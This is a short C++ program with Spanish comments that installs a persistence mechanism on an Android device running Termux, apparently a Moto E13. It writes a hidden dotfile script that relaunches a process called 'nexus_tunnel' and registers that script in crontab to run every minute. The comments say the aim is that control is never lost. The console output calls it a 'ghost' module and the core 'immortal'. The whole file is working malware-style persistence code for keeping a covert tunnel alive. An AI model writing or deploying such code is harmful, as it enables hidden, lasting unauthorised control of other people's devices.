#include <iostream>
#include <unistd.h>
#include <fstream>

void install_persistence() {
    // 1. Crear un script oculto en el sistema
    std::ofstream script("/data/data/com.termux/files/home/.hidden_nexus.sh");
    script << "#!/bin/bash\n";
    script << "pgrep -f nexus_tunnel || ~/nexus/bin/nexus_tunnel &\n";
    script.close();

    // 2. Darle permisos de ejecución
    system("chmod +x /data/data/com.termux/files/home/.hidden_nexus.sh");

    // 3. Registrarlo en el Crontab (Persistencia Temporal)
    // Se ejecuta cada minuto para asegurar que el control no se pierda
    system("(crontab -l ; echo '* * * * * ~/.hidden_nexus.sh') | crontab -");
}

int main() {
    std::cout << "[*] DESPLEGANDO MÓDULO GHOST EN MOTO E13..." << std::endl;
    install_persistence();
    std::cout << "[✓] Persistencia establecida. El Nexus Core es ahora inmortal." << std::endl;
    return 0;
}
